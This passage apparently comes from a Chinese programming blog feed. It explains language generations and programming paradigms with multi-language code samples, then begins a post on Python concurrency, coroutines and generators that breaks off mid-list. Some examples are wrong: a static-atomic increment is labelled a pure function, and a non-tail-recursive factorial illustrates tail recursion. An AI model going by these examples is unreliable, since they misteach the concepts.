<li>在<code>1950</code>年代首次出现，标识为<strong>算法（<code>algorithmic</code>）</strong>或<strong>过程（<code>procedural</code>）</strong>语言。例如<code>C</code>、<code>C++</code>、<code>Java</code>、<code>JavaScript</code>等。</li>
</ul>
</li>
<li>第四代（<code>4GL, Fourth Generation</code>）<ul>
<li>强调相对<code>3GL</code>进步的地方，更高层次的抽象硬件细节、更易于人理解、更强大和更通用，强调对数据集的操作，而不是<strong>比特（<code>bit</code>）</strong>或<strong>字节（<code>byte</code>）</strong>。     </li>
<li>概念在<code>1970~1990</code>年代与<code>3GL</code>同时发展，标识为<strong>非过程（<code>non-procedural</code>）</strong>或<strong>程序生成（<code>program-generating</code>）</strong>语言。</li>
<li>主要应用于数据库管理、报告生成、视图开发和<code>web</code>开发领域，例如<code>SQL</code>。</li>
<li>一些增强的<code>3GL</code>语言，例如<code>Python</code>、<code>Ruby</code>和<code>Perl</code>在<code>3GL</code>环境下扩展了一些<code>4GL</code>能力。</li>
</ul>
</li>
<li>第五代（<code>5GL, Fifth Generation</code>）<ul>
<li>基于程序的<strong>约束条件</strong>解决问题，而非算法。用户只需要考虑需要解决的问题以及需要满足的条件，无需实现程序（<code>routine</code>）或算法。</li>
<li>在1980年代出现，例如<strong>声明式语言（<code>declarative languages</code>）</strong>。</li>
<li>目前应用于人工智能（<code>AI，artificial intelligence</code>）搜索领域。</li>
</ul>
</li>
</ul>
<h1 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h1><p>编程范式（<code>Programming paradigms</code>）是根据语言特性进行分类的方法。一种语言可以支持多种编程范式，分类依据如下：</p>
<ul>
<li>句法（<code>syntax</code>）和语法（<code>Grammar</code>）风格。</li>
<li>执行模型（<code>execution model</code>）：工作顺序、是否允许副作用（<code>side effects</code>）等。<ul>
<li>执行模型决定了工作单元被调度（<code>scheduled</code>）执行的方式，例如工作单元执行的顺序，</li>
<li>通常通过编译器（<code>compiler</code>）或者解释器（<code>interpreter</code>）实现，包含一个运行时系统（<code>runtime system</code>）。<ul>
<li>静态选择（<code>static choice</code>）指工作顺序在执行前已经确定，由编译器实现，工作顺序取决于指令放入可执行文件中的顺序；</li>
<li>动态选择（<code>dynamic choice</code>）指工作顺序在执行期间确定，在运行时系统或者解释器中实现。</li>
</ul>
</li>
<li>另外，执行模型也可以独立于编程语言存在，例如<code>POSIX Threads</code>库。</li>
</ul>
</li>
<li>代码组织方式：面向对象。</li>
</ul>
<h2 id="命令式编程"><a href="#命令式编程" class="headerlink" title="命令式编程"></a>命令式编程</h2><p>命令式编程（<code>Imperative programming</code>）：是面向硬件的抽象，程序员指示机器如何改变它的状态（<code>state</code>）。</p>
<table>
<thead>
<tr>
<th align="left">硬件抽象</th>
<th align="left">图灵机</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">变量</td>
<td align="left">存储状态的单元</td>
<td align="left"><code>x=1;x=2;</code></td>
</tr>
<tr>
<td align="left">表达式</td>
<td align="left">内存引用和算术运算</td>
<td align="left"><code>5+3</code>、<code>&amp;x</code></td>
</tr>
<tr>
<td align="left">赋值语句</td>
<td align="left"><code>get/put</code>指令</td>
<td align="left"><code>x=x+1</code></td>
</tr>
<tr>
<td align="left">控制语句</td>
<td align="left"><code>jump</code>指令</td>
<td align="left"><code>if</code>、<code>for</code></td>
</tr>
</tbody></table>
<p>过程式和面向对象编程中的专有名词有相似的语义，但命名方式不同：</p>
<table>
<thead>
<tr>
<th align="left">Procedural</th>
<th align="left">Object-oriented</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Procedure</td>
<td align="left">Method</td>
</tr>
<tr>
<td align="left">Record</td>
<td align="left">Object</td>
</tr>
<tr>
<td align="left">Module</td>
<td align="left">Class</td>
</tr>
<tr>
<td align="left">Procedure call</td>
<td align="left">Message</td>
</tr>
</tbody></table>
<h3 id="过程式编程"><a href="#过程式编程" class="headerlink" title="过程式编程"></a>过程式编程</h3><p>过程式编程（<code>Procedural programming</code>）：强调将指令（<code>instruction</code>）分组为过程（<code>procedures</code>）。</p>
<ul>
<li>过程（<code>a type of routine or subroutine</code>）可以在程序执行期间的任何时候被其他过程或程序本身调用。</li>
<li><code>1957-1964</code>年首次出现，包括<code>Fortran</code>、<code>ALGOL</code>、<code>COBOL</code>、<code>PL/I</code>和<code>BASIC</code>。<code>1970-1972</code>年<code>Pascal</code>和<code>C</code>语言发布。</li>
</ul>
<h3 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h3><p>面向对象编程（<code>OOP, Object-oriented programming</code>）：强调将指令（<code>instruction</code>）与其操作的状态（<code>state</code>）一起打包为对象（<code>object</code>）。</p>
<h2 id="声明式编程"><a href="#声明式编程" class="headerlink" title="声明式编程"></a>声明式编程</h2><p>声明式编程（<code>Declarative programming</code>）：程序员将期望的结果声明出来，但不关注如何计算它。</p>
<h3 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h3><p>函数式编程（<code>Functional programming</code>）：是面向数学的抽象，期望的结果是一系列函数应用通过<code>lambda</code>演算（<code>λ-calculus</code>）得到的值。<code>1950</code>年代在<code>Lisp</code>语言中首次开发使用，其不擅长处理可变状态和<code>IO</code>。</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left">数学概念</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">变量</td>
<td align="left">一个值的名称，且<code>x=x+1</code>无意义</td>
<td align="left">不可变的（<code>immutable</code>）、不允许赋值语句。</td>
</tr>
<tr>
<td align="left">函数（<code>Subroutine</code>）</td>
<td align="left">自变量的映射（<code>y=f(x)</code>，其中<code>x</code>为自变量，<code>y</code>为因变量）</td>
<td align="left">一个函数的值仅由函数参数决定，不依赖其他状态。</td>
</tr>
<tr>
<td align="left">函数作为一等公民（<code>first-class citizen</code>）</td>
<td align="left"></td>
<td align="left">函数可以在任何地方定义、作为函数的参数和返回值、对函数进行组合等一切操作。</td>
</tr>
<tr>
<td align="left">递归（<code>Recursion</code>）</td>
<td align="left"><code>y=f(x)</code>,其中<code>0&lt;x&lt;10</code>,求<code>y=1000</code>时的<code>x</code>值。每次计算使<code>y=x</code>直至<code>x</code>合法。</td>
<td align="left">函数不断调用自己，直到达到基本条件，可看成对循环语句的模拟。</td>
</tr>
<tr>
<td align="left"><code>lambda</code>演算（<code>λ-calculus</code>）</td>
<td align="left">(<code>x=1,y=3</code>时) <code>z=2x+y+1=2*1+3+1=6 -&gt; z=(λx.(λy.2x+y+1)3)1=(λy.2*1+y+1)3=2*1+3+1=6</code></td>
<td align="left">使用<code>λ</code>标记函数参数，完整抽象了计算机中的函数概念，是图灵完备（<code>Turing completeness</code>）的，从而使得函数式编写的程序可被编译成冯诺伊曼体系结构中机器指令执行。</td>
</tr>
</tbody></table>
<p><strong>特性</strong>：</p>
<ul>
<li><p>程序是通过<strong>应用（<code>applying</code>）</strong>和<strong>组合（<code>composing</code>）</strong>函数进行构造的，函数式编程语言一般提供强大的模式匹配（<code>Pattern Match</code>）；</p>
</li>
<li><p><strong>纯函数（<code>Pure functions, also expression</code>）</strong>是数学函数的计算模拟。</p>
<ul>
<li>对于相同的参数，函数返回值是相同的（可重入的）；</li>
<li>该函数应用程序<strong>没有任何副作用</strong>（<code>Memory/IO</code>）；</li>
<li>纯函数的运算是线程安全（<code>thread-safe</code>）的，意味着如果两个纯函数没有数据依赖，可以<strong>并行（<code>parallel</code>）执行</strong>。<pre><code class="highlight plaintext"># Pure
void f() &#123;
  static std::atomic&lt;int&gt; x = 0;
  ++x;
&#125;

# Impure: because of mutation of a local static variable
void f() &#123;
  static int x = 0;
  ++x;
&#125;

# Impure: because of return value variation with a mutable reference argument
int f(int* x) &#123;
  return *x;
&#125;

# Impure: because of mutation of an output stream
void f() &#123;
  std::cout &lt;&lt; &quot;Hello, world!&quot; &lt;&lt; std::endl;
&#125;</code></pre></li>
</ul>
</li>
<li><p><strong>递归（<code>Recursion</code>）</strong>函数调用自己，直到达到基本条件。函数式编程中通过递归来完成迭代(循环)。</p>
<ul>
<li><strong>尾递归（<code>tail-recursion</code>）</strong>是指递归操作是子例程的最后一步，此时当前过程中的数据不再被需要，无需放入堆栈，因此有利于编译器优化为无需调用栈的实现。<pre><code class="highlight plaintext">unsigned int factorial(unsigned int n) &#123;
    return (n == 0) ? 1 : n * factorial(n - 1);
&#125;</code></pre></li>
</ul>
</li>
<li><p><strong>高阶函数（<code>Higher-order functions</code>）</strong>是指可以将函数作为参数或者返回值的函数，使得复用粒度降低到函数级别。</p>
<div class="tabs" id="higherorderfunctions"><ul class="nav-tabs"><li class="tab active"><a href="#higherorderfunctions-1">c++</a></li><li class="tab"><a href="#higherorderfunctions-2">java</a></li><li class="tab"><a href="#higherorderfunctions-3">c#</a></li><li class="tab"><a href="#higherorderfunctions-4">go</a></li><li class="tab"><a href="#higherorderfunctions-5">javascript</a></li></ul><div class="tab-content"><div class="tab-pane active" id="higherorderfunctions-1"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="keyword">auto</span> twice = [](<span class="type">const</span> std::function&lt;<span class="built_in">int</span>(<span class="type">int</span>)&gt;&amp; f) &#123;</span><br><span class="line">    <span class="keyword">return</span> [&amp;f](<span class="type">int</span> x) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">f</span>(<span class="built_in">f</span>(x));</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> plus_three = [](<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">return</span> i + <span class="number">3</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> g = <span class="built_in">twice</span>(plus_three);</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">g</span>(<span class="number">7</span>) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// 13</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="higherorderfunctions-2"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.function.*;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Function&lt;IntUnaryOperator, IntUnaryOperator&gt; twice = f -&gt; f.andThen(f);</span><br><span class="line">        <span class="type">IntUnaryOperator</span> <span class="variable">plusThree</span> <span class="operator">=</span> i -&gt; i + <span class="number">3</span>;</span><br><span class="line">        <span class="type">var</span> <span class="variable">g</span> <span class="operator">=</span> twice.apply(plusThree);</span><br><span class="line">        System.out.println(g.applyAsInt(<span class="number">7</span>)); <span class="comment">// 13</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="higherorderfunctions-3"><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span> &#123;</span><br><span class="line">        Func&lt;Func&lt;<span class="built_in">int</span>, <span class="built_in">int</span>&gt;, Func&lt;<span class="built_in">int</span>, <span class="built_in">int</span>&gt;&gt; twice = f =&gt; x =&gt; f(f(x));</span><br><span class="line">        Func&lt;<span class="built_in">int</span>, <span class="built_in">int</span>&gt; plusThree = i =&gt; i + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">var</span> g = twice(plusThree);</span><br><span class="line">        Console.WriteLine(g(<span class="number">7</span>)); <span class="comment">// 13</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="higherorderfunctions-4"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">twice</span><span class="params">(f <span class="keyword">func</span>(<span class="type">int</span>)</span></span> <span class="type">int</span>) <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(x <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> f(f(x))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    plusThree := <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> i + <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">    g := twice(plusThree)</span><br><span class="line">    fmt.Println(g(<span class="number">7</span>)) <span class="comment">// 13</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="higherorderfunctions-5"><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">twice</span> = f =&gt; <span class="function"><span class="params">x</span> =&gt;</span> <span class="title function_">f</span>(<span class="title function_">f</span>(x));</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">plusThree</span> = i =&gt; i + <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> g = <span class="title function_">twice</span>(plusThree);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">g</span>(<span class="number">7</span>)); <span class="comment">// 13</span></span><br></pre></td></tr></table></figure></div></div></div>
</li>
<li><p><strong>柯里化（<code>currying</code>）</strong>是一种将多个参数的函数转换为单个参数的函数序列的技术，是为了适配<code>lambda</code>演算过程要求只有一个参数而发明。</p>
<pre><code class="highlight plaintext">x = f(a,b,c) becomes:
  h = g(a)
  i = h(b)
  x = i(c)
called in sequence:
  x = g(a)(b)(c)</code></pre>
</li>
<li><p><strong>惰性求值（<code>non-strict/lazy evaluation</code>）</strong>只有当函数内的计算需要使用参数的值时，才计算函数参数。函数式编程中多使用惰性求值。<strong>严格求值（<code>strict evaluation</code>）</strong>总是在调用函数之前完全计算函数参数。</p>
<pre><code class="highlight plaintext"># 严格求值时报除0错误，惰性求值时得到数组长度为4.
print length([2+1, 3*2, 1/0, 5-4])</code></pre>
</li>
<li><p><strong>引用透明（<code>Referential transparency</code>）</strong>是指变量可以在执行期间的任何时间点用真实值取代，而不会影响结果。函数式编程中变量一旦被定义就不会再改变，因此<strong>不支持赋值语句</strong>，函数式编程都是引用透明的。</p>
<pre><code class="highlight plaintext"># x初始为1时，连续两次执行赋值语句分别得到2和3。赋值语句从来不是引用透明的。
x = x + 1

# x初始为1时，连续两次执行函数调用分别得到2和2。函数是透明的，不会隐式改变x，没有副作用。
int plusone(int x) &#123; return x+1; &#125;</code></pre>
</li>
<li><p><a href="/ProgrammingLanguage/Closure"><strong>闭包（<code>Closure</code>）</strong></a>是一种在支持函数作为一等公民的编程语言中实现词法作用域内进行名称绑定的技术，它同时存储了函数与其环境。这个概念是在<code>lambda</code>演算（<code>λ-calculus</code>）过程中用于评估表达式而设计。</p>
<pre><code class="highlight plaintext"># python中匿名函数实现闭包
def f(x):
    def g(y):
        return x + y
    return g  # Return a closure.

def h(x):
    return lambda y: x + y  # Return a closure.

# Assigning specific closures to variables.
a = f(1)
b = h(1)

# Using the closures stored in variables.
assert a(5) == 6
assert b(5) == 6

# Using closures without binding them to variables first.
assert f(1)(5) == 6  # f(1) is the closure.
assert h(1)(5) == 6  # h(1) is the closure.</code></pre></li>
</ul>
<h3 id="逻辑式编程"><a href="#逻辑式编程" class="headerlink" title="逻辑式编程"></a>逻辑式编程</h3><p>逻辑式编程（<code>Logic programming</code>）：是基于<strong>形式逻辑（<code>formal logic</code>）</strong>的抽象，期望的结果是由事实（<code>fact</code>）和规则（<code>rule</code>）构成的一些条款（<code>clause</code>）。</p>
<ul>
<li><code>1960-1970</code>年代讨论人工智能（<code>artificial intelligence</code>）时出现，包括<code>Prolog</code>、<code>Datalog</code>。</li>
</ul>
<h3 id="响应式编程"><a href="#响应式编程" class="headerlink" title="响应式编程"></a>响应式编程</h3><p>响应式编程（<code>Reactive programming</code>）期望的结果是用数据流（<code>data stream</code>）和传播变化（<code>propagation of change</code>）来声明的。</p>
<pre><code class="highlight plaintext">// 命令式编程不会传播变化
var b = 1
var c = 2
var a = b + c
b = 10
console.log(a) // 3 (not 12 because &quot;=&quot; is not a reactive assignment operator)

// 想象&quot;$=&quot;除了支持在初始时赋值，也支持在右边变化时重新赋值
var b = 1
var c = 2
var a $= b + c
b = 10
console.log(a) // 12 (because &quot;$=&quot; is a imagine reactive assignment operator)</code></pre>

<ul>
<li>应用在硬件描述语言，比如<code>Verilog</code>，可以通过电路构建传播模型。</li>
<li>在<code>model–view–controller (MVC)</code>架构中，底层模型（<code>model</code>）中的更改会自动反应到关联的视图（<code>view</code>）中。</li>
</ul>
<h2 id="反射编程"><a href="#反射编程" class="headerlink" title="反射编程"></a>反射编程</h2><p>反射编程（<code>reflective programming</code>）是支持检查、修改自身数据结构与行为的能力。</p>
<ul>
<li>早期的汇编语言天生支持此能力，后续的高级语言逐渐消失，直至内置反射类型系统的语言出现。</li>
<li>反射特别适合以同样方式处理不同数据的场景，比如数据的序列化、绑定、展示、转换。对于网络应用、运行时检查或修改程序行为、软件测试（运行时实例化对象）十分便利。</li>
</ul>
<h2 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h2><p>并发编程（<code>Concurrent programming</code>）适用于有并发模型的语言，涉及多线程（<code>multi-threading</code>）、分布式计算（<code>distributed computing</code>）、消息传递（<code>message passing</code>）、共享资源（<code>shared resources</code>）、期望与承诺（<code>future&amp;promise</code>）。</p>
<h3 id="角色模型"><a href="#角色模型" class="headerlink" title="角色模型"></a>角色模型</h3><p>角色模型（<code>Actor model</code>）在计算机科学中是一种用于并发计算的数学模型。</p>
<ul>
<li>1973年收到物理学启发，应对高并行计算的需要而设计。</li>
<li>当角色收到消息时，可能的行为有：本地决策、创建其他角色、发送消息、考虑如何处理下一条消息；</li>
<li>每个角色可以有自己的私有状态，但状态改变时只能通过消息在角色间相互传递。因为没有共享的状态，所以不需要依赖锁进行同步（<code>lock-based synchronization</code>）；</li>
</ul>
<pre><code class="highlight plaintext"># &lt;基于Actor模型构建简单的存储单元&gt;
# Actor对象: 存储单元
Cell ≡
    receiver
        Request[Create[initial] customer]
            send customer Returned[serializer ReadWrite(initial)]
# Actor行为：读写数据
# - behavior是流水线式的，当后续的read/write消息到达时，behavior可能正处理之前的消息；
ReadWrite(contents) ≡
    behavior
        Request[read[] customer]
            &#123;send customer Returned[contents], ReadWrite(contents)&#125;
        Request[write[x] customer]
            &#123;send customer Returned[], ReadWrite(x)&#125;

# 示例：创建一个初始值为5的Actor对象x，然后并发的向x写入7和9，最后读取x的值。
# （x最终的结果可能为5、7或9）
let x = Cell.Create[5] in &#123;x.write[7], x.write[9], x.read[]&#125;</code></pre>

<p><a href="https://github.com/lightful/syscpp.git">syscpp: 基于C++11的模板元编程实现的Actor精简并发模型</a></p>
<h2 id="泛型编程"><a href="#泛型编程" class="headerlink" title="泛型编程"></a>泛型编程</h2><p>泛型编程（<code>Generic programming</code>）是指编写时以通用类型表示算法，后续根据传参按需进行实例化类型的风格。</p>
<ul>
<li><code>1973</code>年在<code>ML</code>语言中首创，运行编写通用类型的函数以减少重复，也被称为参数多态性（<code>Parametric polymorphism</code>）；</li>
<li><code>1989</code>年由<code>Musser &amp; Stepanov (1989)</code>定义了泛型编程（<code>Generic programming</code>）概念：从具体的算法中抽象出泛型算法，再与各种数据结合产生有用的软件；</li>
<li>因<code>C++</code>中的标准模板库（<code>STL, Standard Template Library</code>）而闻名，使用迭代器（<code>Iterator</code>）解耦了序列化数据和操作它们的算法；</li>
<li>数组（<code>Array</code>）和结构体（<code>Struct</code>）也可以看作预定义的泛型类型；<ul>
<li>数组或结构类型的每次使用都会实例化一个新的具体类型，或重用先前实例化的类型。</li>
<li>数组元素类型和结构元素类型是参数化类型（<code>parameterized type</code>），用于实例化相应的泛型类型（<code>generic type</code>）。</li>
<li>所有这些通常都是编译器内建的，其语法与其他泛型结构不同。</li>
</ul>
</li>
</ul>
<h3 id="模板元编程"><a href="#模板元编程" class="headerlink" title="模板元编程"></a>模板元编程</h3><p>模板元编程（<code>TMP, Template metaprogramming</code>）是指编译器使用模板生成临时源代码，并将其与源代码的其余部分合并，然后进行编译的技术。</p>
<h2 id="动态编程"><a href="#动态编程" class="headerlink" title="动态编程"></a>动态编程</h2><p>动态编程语言（<code>Dynamic programming language</code>）是指在运行时执行静态编程语言在编译期间执行的许多常见编程行为。</p>
<ul>
<li>大部分动态语言也是动态类型的（<code>dynamically typed</code>），也经常被称为脚本语言（<code>scripting languages</code>），即使脚本语言狭义上的定义为特定于运行环境的语言。</li>
<li><code>Eval</code>函数：一些动态语言会提供<code>eval</code>函数，接受一个包含该语言中的代码的字符串参数并执行它，如果此代码代表一个表达式，则返回结果值。</li>
<li>对象运行时改变（<code>Object runtime alteration</code>）：在动态语言中，类型或对象系统通常可以在运行时进行修改。</li>
<li>反射（<code>Reflection</code>）：反射在许多动态语言中都很常见，通常涉及对泛型或多态数据的类型和元数据的分析。</li>
<li>宏命令（<code>Macros</code>）：有些动态语言将代码内省和<code>eval</code>进行结合，提供提供对编译器内部工作方式的访问，以及对解释器、虚拟机或运行时的完全访问，允许定义可以优化代码或修改语言语法的结构（<code>Assembly</code>、<code>C</code>、<code>c++</code>、早期<code>Java</code>一般不属于这一类）。</li>
<li>流行的动态编程语言包括<code>JavaScript</code>、<code>Python</code>、<code>Ruby</code>、<code>PHP</code>、<code>Lua</code>和<code>Perl</code>。</li>
</ul>
<h2 id="事件驱动编程"><a href="#事件驱动编程" class="headerlink" title="事件驱动编程"></a>事件驱动编程</h2><p>事件驱动编程（<code>Event-driven programming</code>）是指程序的流程由用户操作(鼠标点击、按键)、传感器输出或其他程序或线程传递的消息等事件决定的。</p>
<ul>
<li>通常有一个主循环侦听事件，然后在检测到其中一个事件时触发回调函数。</li>
<li>在嵌入式系统中，可以使用硬件中断而不是持续运行的主循环来实现相同的目的。</li>
<li>事件驱动的程序在<code>await</code>和闭包（<code>closures</code>）等高层次抽象的语言中实现更简单。</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://en.wikipedia.org/wiki/Programming_paradigm">https://en.wikipedia.org/wiki/Programming_paradigm</a><br>[2] <a href="https://en.wikipedia.org/wiki/Lambda_calculus">https://en.wikipedia.org/wiki/Lambda_calculus</a><br>[3] <a href="https://cgnail.github.io/academic/lambda-1/">https://cgnail.github.io/academic/lambda-1/</a><br>[4] <a href="https://mp.weixin.qq.com/s?__biz=MzIwMDgyNzUzNw==&mid=2247483658&idx=1&sn=2dde89033d2fef0cba307db9b8b5489e&scene=0#wechat_redirect">符号: 抽象、语义</a><br>[5] <a href="https://www.zhihu.com/question/28292740">什么是函数式编程思维？</a><br>[6] <a href="https://zhuanlan.zhihu.com/p/21346046">到底什么是闭包</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
      </categories>
  </entry>
  <entry>
    <title>Python并发编程</title>
    <url>/ProgrammingLanguage/Python/Concurrent.html</url>
    <content><![CDATA[<p>python中实现并发编程的三种方式及其应用场景。</p>
<span id="more"></span>
<h1 id="concurrency（并发性）"><a href="#concurrency（并发性）" class="headerlink" title="concurrency（并发性）"></a>concurrency（并发性）</h1><ul>
<li>Process: 多个进程可在多个CPU核心上并行执行</li>
<li>Thread: 适合抢占式多任务（preemptively multitasked），操作系统决定什么时候切换任务<ul>
<li>支持并发执行（concurrency）和并行执行（parallelism）</li>
</ul>
</li>
<li>Coroutines: 适合协同式多任务（cooperatively multitasked），由任务决定什么时候放弃控制器<ul>
<li>支持并发执行（concurrency），但不支持并行执行（parallelism）</li>
<li>协程的切换不需要调用任何系统接口，也不会阻塞其他协程的处理过程</li>
<li>协程的切换不需要mutex,semaphore等同步原语的参与</li>
</ul>
</li>
</ul>
<h1 id="Process-based"><a href="#Process-based" class="headerlink" title="Process-based"></a>Process-based</h1><ul>
<li><code>multiprocessing</code>模块支持多进程编程，每个进程有自己独立的解释器，因此不受GIL限制，支持并行执行（Parallelism）</li>
</ul>
<h1 id="Thread-based"><a href="#Thread-based" class="headerlink" title="Thread-based"></a>Thread-based</h1><p><a href="https://www.dabeaz.com/GIL/gilvis/index.html">A Zoomable Interactive Python Thread Visualization</a><br><a href="https://www.cnblogs.com/gengcx/p/7500401.html">Python全局解释器锁</a></p>
<ul>
<li>CPython解释器：<ul>
<li><code>threading</code>模块创建的python线程等同于系统线程（pthread&#x2F;windows threads），完全由操作系统管理</li>
<li>解释器中存在全局锁 - Global interpreter Lock(GIL)，以确保解释器只同时运行一个线程，这简化了内存管理等问题，但限制了并行执行<ul>
<li>当线程A运行时，它持有GIL；当遇到I&#x2F;O（read,write,send,recv,…)时释放GIL</li>
<li>GIL是基于mutex和condition varibale实现的</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="Coroutine-based"><a href="#Coroutine-based" class="headerlink" title="Coroutine-based"></a>Coroutine-based</h1><ul>
<li>python实现是在单个处理器上运行，因此一次只能运行一个协程</li>
</ul>
<h2 id="coroutine-vs-subroutine"><a href="#coroutine-vs-subroutine" class="headerlink" title="coroutine vs subroutine"></a>coroutine vs subroutine</h2><ul>
<li>Coroutine 协程：在非抢占式多任务中，通过suspended&#x2F;resumed的方式用来生成Subroutine。<ul>
<li>Melvin Conway在1958年发明此术语，用于汇编程序的构造过程中（from <a href="https://en.wikipedia.org/wiki/Coroutine">wiki coroutine</a>）；</li>
<li>可以通过调用其他协程而退出，并且后来可回到之前退出时的执行点，从协程自身的角度看，退出只是呼叫了另一个协程。</li>
<li>协程可能同时有multiple-instance存在，每个instance可能维护着不同的状态；</li>
<li>两个coroutine之间是symmetric的关系</li>
</ul>
</li>
<li>Subroutine 子例程<ul>
<li>Subroutine可以看成是一种特殊的Coroutine;</li>
<li>有确定的入口和出口，只返回一次，在调用期间无需维护状态；</li>
<li>两个subroutine之间是caller-callee的关系；</li>
</ul>
</li>
</ul>
<div class="tabs" id="coroutine"><ul class="nav-tabs"><li class="tab active"><a href="#coroutine-1">coroutine used in P/C</a></li></ul><div class="tab-content"><div class="tab-pane active" id="coroutine-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var q := new queue</span><br><span class="line"></span><br><span class="line">coroutine produce</span><br><span class="line">    loop</span><br><span class="line">        while q is not full</span><br><span class="line">            create some new items</span><br><span class="line">            add the items to q</span><br><span class="line">        yield to consume</span><br><span class="line"></span><br><span class="line">coroutine consume</span><br><span class="line">    loop</span><br><span class="line">        while q is not empty</span><br><span class="line">            remove some items from q</span><br><span class="line">            use the items</span><br><span class="line">        yield to produce</span><br><span class="line"></span><br><span class="line">call produce</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="coroutine-vs-generator"><a href="#coroutine-vs-generator" class="headerlink" title="coroutine vs generator"></a>coroutine vs generator</h2><ul>
<li>Coroutines 协程<ul>
<li>yield语句可以让执行器立即执行其他协程</li>
</ul>
</li>
<li>Generator 生成器<ul>
<li>generator主要用于简化迭代器的编写</li>
<li>yield语句只能将控制权返回给生成器的调用者</li>
<li>可以在生成器基础上实现协程<ul>
<li>引入调度（dispatcher）例程后，可以通过token显式的将控制权传递给生成器</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="coroutine"><ul class="nav-tabs"><li class="tab active"><a href="#coroutine-1">coroutine used in P/C</a></li></ul><div class="tab-content"><div class="tab-pane active" id="coroutine-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var q := new queue</span><br><span class="line"></span><br><span class="line">generator produce</span><br><span class="line">    loop</span><br><span class="line">        while q is not full</span><br><span class="line">            create some new items</span><br><span class="line">            add the items to q</span><br><span class="line">        yield consume</span><br><span class="line"></span><br><span class="line">generator consume</span><br><span class="line">    loop</span><br><span class="line">        while q is not empty</span><br><span class="line">            remove some items from q</span><br><span class="line">            use the items</span><br><span class="line">        yield produce</span><br><span class="line"></span><br><span class="line">subroutine dispatcher</span><br><span class="line">    var d := new dictionary(generator → iterator)</span><br><span class="line">    d[produce] := start produce</span><br><span class="line">    d[consume] := start consume</span><br><span class="line">    var current := produce</span><br><span class="line">    loop</span><br><span class="line">        call current</span><br><span class="line">        current := next d[current]</span><br><span class="line"></span><br><span class="line">call dispatcher</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h2><h3 id="generator-based"><a href="#generator-based" class="headerlink" title="generator-based"></a>generator-based</h3><ul>
<li>基于generator对象实现协程：<ul>
<li>协程A通过yield返回A&#x2F;generator对象的方式放弃控制权给执行器，执行器将控制权分发至协程B</li>
